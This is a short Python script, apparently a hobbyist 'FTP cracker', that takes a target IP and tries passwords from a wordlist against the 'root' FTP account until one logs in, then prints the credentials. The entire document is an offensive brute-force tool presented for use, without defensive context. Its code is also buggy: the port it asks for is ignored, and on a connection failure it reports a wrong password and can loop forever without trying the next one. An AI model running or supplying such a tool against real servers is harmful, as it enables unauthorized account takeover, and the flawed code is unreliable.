#Client
import ftplib

print ("Welcome to FTP cracker made by PONY")
ip = str(input("Enter ip to scan: \n"))
port = int(input("Enter port to attack(def is 21): \n"))

passfile = open("Path to pass file", "r")
username = "root"

password=passfile.readline().replace("\n", "")
while password:
    try:
        ftp =ftplib.FTP(ip)
        try:
            print ("Trying passsword %s" %(password))
            ftp.login(username,password)
            print ("Login successful")
            print ("The username is %s, the password is %s" % (username, password))
            break
        except:
            ftp.close()
            password = passfile.readline().replace("\n", "")
    except:
        print ("Wrong password")
passfile.close()